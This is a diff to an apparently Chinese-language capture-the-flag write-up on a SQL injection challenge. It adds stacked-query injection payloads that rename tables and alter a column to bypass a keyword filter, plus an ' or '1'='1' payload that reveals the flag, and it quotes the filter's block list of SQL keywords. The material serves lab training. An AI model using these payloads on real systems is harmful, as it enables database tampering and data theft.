@@ -52,7 +52,7 @@ return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
 /?inject=1';
 RENAME TABLE `words` TO `words1`;
 RENAME TABLE `1919810931114514` TO `words`;
-ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100);
+ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;
 show columns from words;#`
 ```
 
@@ -61,7 +61,7 @@ show columns from words;#`
 > - [ALTER TABLE](https://www.w3school.com.cn/sql/sql_alter.asp)：用于在已有的表中添加、修改或删除列
 >   - ADD：添加字段 `ALTER TABLE 'table' ADD '新字段名' '类型'`
 >   - DROP：删除字段`ALTER TABLE 'table' DROP COLUMN '字段名'`
->   - CHANGE：修改字段
+>   - CHANGE：修改字段`ALTER TABLE 'table' CHANGE '字段名' '新字段名' 类型`
 >
-> 
 
+构造:`/?inject=1 ' or '1'='1';#` 获得Flag！
